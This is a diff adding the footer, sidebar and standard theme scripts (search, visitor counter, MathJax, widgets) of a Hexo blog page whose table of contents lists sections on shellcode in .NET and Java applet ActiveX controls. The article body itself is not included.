+              <a href="/categories/index.html">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-利用可执行内存"><span class="nav-number">1.</span> <span class="nav-text">1. 利用可执行内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-实验代码"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 实验代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-实验内容"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 实验内容</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-利用-NET"><span class="nav-number">2.</span> <span class="nav-text">2. 利用.NET</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-ActiveX控件"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 ActiveX控件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-包含shellcode的-NET控件"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 包含shellcode的.NET控件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-POC及测试"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 POC及测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-利用java-applet"><span class="nav-number">3.</span> <span class="nav-text">3. 利用java applet</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-ActiveX控件"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 ActiveX控件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-包含shellcode的Java-Applet控件"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 包含shellcode的Java Applet控件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-3-POC及其利用"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 POC及其利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Introspelliam</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+  
+
+
+  
+
+  
+
+</body>
+</html>
